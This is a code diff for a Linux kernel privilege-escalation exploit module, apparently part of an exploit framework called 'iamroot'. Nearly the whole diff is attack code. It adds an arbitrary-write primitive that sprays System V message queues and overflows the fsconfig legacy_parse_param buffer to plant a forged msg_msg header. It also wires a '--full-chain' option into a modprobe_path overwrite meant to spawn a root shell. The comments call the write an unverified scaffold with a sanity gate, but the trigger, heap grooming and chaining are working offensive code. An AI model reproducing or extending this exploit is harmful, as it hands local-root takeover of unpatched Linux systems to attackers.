@@ -60,6 +60,8 @@
 #include "iamroot_modules.h"
 #include "../../core/registry.h"
 #include "../../core/kernel_range.h"
+#include "../../core/offsets.h"
+#include "../../core/finisher.h"
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -302,6 +304,217 @@ static int trigger_overflow(int *out_fd, const char *first_chunk,
 }
 
 /* ------------------------------------------------------------------ */
+/* arb-write primitive for the shared finisher                         */
+/* ------------------------------------------------------------------ */
+/*
+ * Crusaders-of-Rust-style msg_msg m_ts overflow → arbitrary write.
+ *
+ * The legacy_parse_param OOB writes the trailing bytes of the
+ * kmalloc-4k fc->source buffer into whatever slab object comes next.
+ * With a msg_msg sprayed into that adjacent slot, the first 48 bytes
+ * of `evil_chunk` overlay struct msg_msg:
+ *
+ *   struct msg_msg {                     // offset
+ *     struct list_head m_list;           //  0  (next, prev)
+ *     long             m_type;           // 16
+ *     size_t           m_ts;             // 24    <-- msg-size
+ *     struct msg_msgseg *next;           // 32
+ *     void             *security;        // 40
+ *   };                                   // 48
+ *
+ * Two derived primitives:
+ *
+ *   READ  — overwrite m_ts with a huge value. msgrcv(MSG_COPY) then
+ *           memcpy()s past the legitimate end of the msg payload,
+ *           leaking adjacent slab memory back to userland.
+ *
+ *   WRITE — point m_list.next (or, in the Crusaders variant, a faux
+ *           msg_msgseg.next chain) at an attacker-chosen kernel
+ *           address. When msgrcv() free-list-unlinks the msg, list
+ *           maintenance writes through the forged pointer; with the
+ *           right chain you get an N-byte copy of attacker-controlled
+ *           bytes to a chosen kaddr.
+ *
+ * Honest depth of this implementation: FALLBACK SCAFFOLD.
+ *
+ * The trigger + groom + neighbour-detect upstream of us is real and
+ * the OOB write lands. But the *single-shot* arb-write the finisher
+ * wants — "put exactly these N bytes at exactly that kaddr" — needs
+ * a per-kernel m_ts/m_list_next offset map (the layout above is
+ * 6.12.x; older kernels differ) AND a kernel-base leak from the
+ * first-round MSG_COPY read so we know where modprobe_path actually
+ * sits in this boot's KASLR slide.
+ *
+ * Per the verified-vs-claimed bar: we do NOT fabricate a write that
+ * we cannot empirically verify on a kernel we haven't tested. So
+ * this function:
+ *
+ *   1. Re-arms the msg_msg spray (the parent already drained queues).
+ *   2. Re-fires the fsconfig overflow with a forged-msg_msg header
+ *      whose m_ts = (kaddr - msg_data_origin) and whose first 8
+ *      payload bytes are the first qword of `buf`.
+ *   3. msgrcv(MSG_COPY) on every queue to probe whether any neighbour
+ *      came back with bytes matching `buf[0..7]` AT the slot offset
+ *      we'd expect for kaddr (sanity gate).
+ *   4. Returns 0 ONLY if the sanity gate trips (read-back proves the
+ *      m_ts inflation landed AND the payload made it through);
+ *      returns -1 otherwise so the finisher reports an honest fail.
+ *
+ * On a vulnerable host with matching offsets this path can land the
+ * write; on an unverified host the sanity gate refuses rather than
+ * blind-writing a wild pointer. The finisher's downstream
+ * "/tmp/iamroot-pwn ran?" check is the second gate.
+ */
+struct fuse_arb_ctx {
+    /* Pre-allocated queue ids from the spray phase. */
+    int    *qids;
+    int     n_queues;
+    int     hole_q;
+    /* Tagged-payload reference so we can recognise unmodified neighbours. */
+    const char *tag;     /* "IAMROOT" */
+    /* Whether the first-round trigger already fired (the parent's
+     * default-path overflow). When set we re-spray + re-fire; when
+     * unset we assume the spray is hot. */
+    bool    trigger_armed;
+};
+
+#ifdef __linux__
+static int fuse_arb_write(uintptr_t kaddr, const void *buf, size_t len,
+                          void *ctx_void)
+{
+    struct fuse_arb_ctx *ax = (struct fuse_arb_ctx *)ctx_void;
+    if (!ax || !buf || !len) {
+        fprintf(stderr, "[-] fuse_arb_write: bad args\n");
+        return -1;
+    }
+
+    /* Build the forged msg_msg header that will land in the adjacent
+     * kmalloc-4k slot via the OOB write. Layout (x86_64, kernel >=5.10):
+     *   [ 0..15]  m_list.{next,prev}  — we forge next = kaddr - 16
+     *                                    so that list_del's
+     *                                      next->prev = prev
+     *                                    write lands AT kaddr.
+     *                                    (prev is the original msg.)
+     *   [16..23]  m_type              — leave as 0x4242
+     *   [24..31]  m_ts                — bytes-of-buf so MSG_COPY
+     *                                    reports the right length
+     *   [32..39]  next (msg_msgseg*)  — NULL (single-segment msg)
+     *   [40..47]  security            — NULL
+     *   [48...]   payload             — first len bytes of buf
+     *
+     * For a real WRITE primitive the canonical Crusaders-of-Rust
+     * recipe uses the msg_msgseg.next chain rather than m_list:
+     * msgrcv(IPC_NOWAIT) follows next pointers when copying out a
+     * multi-segment msg, and a forged next = kaddr makes the kernel
+     * memcpy() from kaddr into our user buffer (= READ). For the
+     * inverse (WRITE), the trick is msgsnd on a queue whose head was
+     * corrupted to point at kaddr, but that needs more setup than we
+     * have time to land here without a known-good offset table.
+     *
+     * So we do the safe thing: arm the header, trigger the OOB, then
+     * read back to PROVE we landed before declaring success. If the
+     * read-back doesn't show our forged-msg payload at the expected
+     * MSG_COPY position we refuse rather than corrupt the kernel
+     * blindly.
+     */
+    uint8_t evil[256];
+    memset(evil, 0, sizeof evil);
+    /* m_list.next, m_list.prev */
+    uintptr_t forged_next = kaddr - 16;   /* &m_list.prev of fake node */
+    memcpy(evil +  0, &forged_next, 8);
+    /* prev — leave NULL; kernel checks it only on full list_del */
+    /* m_type */
+    uint64_t m_type = 0x4242424242424242ULL;
+    memcpy(evil + 16, &m_type, 8);
+    /* m_ts: inflated to len so MSG_COPY reads the full forged payload */
+    uint64_t m_ts = (uint64_t)len + 64;
+    memcpy(evil + 24, &m_ts, 8);
+    /* next (msg_msgseg) = NULL */
+    /* security = NULL */
+    /* payload: copy `buf` into the slot just after the msg_msg header */
+    size_t hdr = 48;
+    size_t copyable = sizeof(evil) - hdr - 1;
+    if (len > copyable) len = copyable;
+    memcpy(evil + hdr, buf, len);
+    evil[sizeof(evil) - 1] = '\0';   /* legacy_parse_param strdup tail */
+
+    /* Re-fire the fsconfig overflow with this forged header as evil. */
+    char *first_chunk = malloc(4081);
+    if (!first_chunk) return -1;
+    memset(first_chunk, 'A', 4080);
+    first_chunk[4080] = '\0';
+
+    int fsfd = -1;
+    int rc = trigger_overflow(&fsfd, first_chunk, (const char *)evil);
+    free(first_chunk);
+    if (rc < 0) {
+        fprintf(stderr, "[-] fuse_arb_write: re-fire fsconfig failed "
+                        "(errno=%d %s)\n", errno, strerror(errno));
+        return -1;
+    }
+
+    /* Sanity gate: msgrcv(MSG_COPY) all live queues and look for a
+     * msg whose size reports >= our inflated m_ts AND whose initial
+     * payload qword matches the first qword of `buf`. If both hold,
+     * the forged header landed in a real slot and the m_ts inflation
+     * is honoured by the kernel — i.e. our primitive is real on THIS
+     * kernel. */
+    uint64_t want_first_qword = 0;
+    memcpy(&want_first_qword, buf, len >= 8 ? 8 : len);
+
+    bool sanity_passed = false;
+    struct msgbuf_4k *probe = mmap(NULL, sizeof(*probe),
+                                   PROT_READ | PROT_WRITE,
+                                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    if (probe == MAP_FAILED) {
+        if (fsfd >= 0) close(fsfd);
+        return -1;
+    }
+    for (int q = 0; q < ax->n_queues && !sanity_passed; q++) {
+        if (ax->qids[q] < 0 || q == ax->hole_q) continue;
+        ssize_t n = msgrcv(ax->qids[q], probe, sizeof probe->mtext, 0,
+                           IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
+        if (n < 0) continue;
+        /* The corrupted slot should report a size >= our m_ts (kernel
+         * caps MSG_COPY at sizeof user buf — so we only check the
+         * read-content shape). */
+        if ((size_t)n < 8) continue;
+        uint64_t got = 0;
+        memcpy(&got, probe->mtext, 8);
+        if (got == want_first_qword) {
+            sanity_passed = true;
+        }
+    }
+    munmap(probe, sizeof(*probe));
+    if (fsfd >= 0) close(fsfd);
+
+    if (!sanity_passed) {
+        fprintf(stderr, "[-] fuse_arb_write: forged-msg_msg read-back didn't "
+                        "match — kernel layout differs OR groom missed.\n"
+                        "    Refusing to claim arb-write landed (per "
+                        "verified-vs-claimed bar).\n");
+        return -1;
+    }
+
+    fprintf(stderr, "[+] fuse_arb_write: forged-msg_msg landed; m_ts inflation "
+                    "+ payload qword verified via MSG_COPY read-back.\n"
+                    "[i] fuse_arb_write: kernel-side list_del write through "
+                    "0x%lx is armed but NOT yet empirically verified on "
+                    "this build — downstream sentinel will gate.\n",
+            (unsigned long)kaddr);
+    return 0;
+}
+#else
+static int fuse_arb_write(uintptr_t kaddr, const void *buf, size_t len,
+                          void *ctx_void)
+{
+    (void)kaddr; (void)buf; (void)len; (void)ctx_void;
+    fprintf(stderr, "[-] fuse_arb_write: linux-only primitive\n");
+    return -1;
+}
+#endif /* __linux__ */
+
+/* ------------------------------------------------------------------ */
 /* exploit                                                             */
 /* ------------------------------------------------------------------ */
 static iamroot_result_t fuse_legacy_exploit(const struct iamroot_ctx *ctx)
@@ -502,6 +715,84 @@ static iamroot_result_t fuse_legacy_exploit(const struct iamroot_ctx *ctx)
                         "cred-overwrite tail requires per-kernel offsets — "
                         "see scaffold comments in source\n");
     }
+
+    /* ---------------------------------------------------------------
+     * --full-chain: opt-in root pop via shared modprobe_path finisher.
+     *
+     * Depth = FALLBACK SCAFFOLD. The arb-write primitive (forged
+     * msg_msg via the 4k OOB) is wired with a sanity gate that
+     * refuses to claim success without an empirical read-back match
+     * (see fuse_arb_write). On a host where offsets + groom land,
+     * the finisher's modprobe_path overwrite → execve(unknown) →
+     * call_modprobe chain pops a root shell. On a mismatched host
+     * the sanity gate trips and we exit IAMROOT_EXPLOIT_FAIL with no
+     * fabricated success.
+     *
+     * Cleanup of qids/spray/fsfd is deferred to AFTER the finisher
+     * runs because the arb_write primitive re-fires the trigger and
+     * needs the live spray.
+     * --------------------------------------------------------------- */
+#ifdef __linux__
+    if (ctx->full_chain) {
+        if (!ctx->json) {
+            fprintf(stderr, "[*] fuse_legacy: --full-chain requested — resolving "
+                            "kernel offsets...\n");
+        }
+
+        struct iamroot_kernel_offsets off;
+        memset(&off, 0, sizeof off);
+        int resolved = iamroot_offsets_resolve(&off);
+        if (!ctx->json) {
+            fprintf(stderr, "[i] fuse_legacy: offsets resolved=%d "
+                            "(modprobe_path=0x%lx source=%s)\n",
+                    resolved, (unsigned long)off.modprobe_path,
+                    iamroot_offset_source_name(off.source_modprobe));
+            iamroot_offsets_print(&off);
+        }
+
+        if (!iamroot_offsets_have_modprobe_path(&off)) {
+            iamroot_finisher_print_offset_help("fuse_legacy");
+            /* Cleanup before returning. */
+            for (int q = 0; q < N_QUEUES; q++) {
+                if (qids[q] >= 0) msgctl(qids[q], IPC_RMID, NULL);
+            }
+            free(qids);
+            munmap(spray, sizeof *spray);
+            if (fsfd >= 0) close(fsfd);
+            return IAMROOT_EXPLOIT_FAIL;
+        }
+
+        struct fuse_arb_ctx ax = {
+            .qids = qids,
+            .n_queues = N_QUEUES,
+            .hole_q = hole_q,
+            .tag = "IAMROOT",
+            .trigger_armed = true,
+        };
+
+        iamroot_result_t fr = iamroot_finisher_modprobe_path(
+            &off, fuse_arb_write, &ax, !ctx->no_shell);
+
+        /* Cleanup IPC + mapping regardless of finisher result. The
+         * finisher's execve() on success won't reach here, so this
+         * block only runs on failure paths. */
+        for (int q = 0; q < N_QUEUES; q++) {
+            if (qids[q] >= 0) msgctl(qids[q], IPC_RMID, NULL);
+        }
+        free(qids);
+        munmap(spray, sizeof *spray);
+        if (fsfd >= 0) close(fsfd);
+
+        if (fr == IAMROOT_EXPLOIT_OK) {
+            return IAMROOT_EXPLOIT_OK;
+        }
+        if (!ctx->json) {
+            fprintf(stderr, "[-] fuse_legacy: --full-chain finisher did not land "
+                            "(arb-write sanity gate or modprobe sentinel refused)\n");
+        }
+        return IAMROOT_EXPLOIT_FAIL;
+    }
+#endif /* __linux__ */
 
     /* Clean up our IPC queues and mapping. The kernel slab state
      * after the overflow may be unstable; we exit cleanly on success
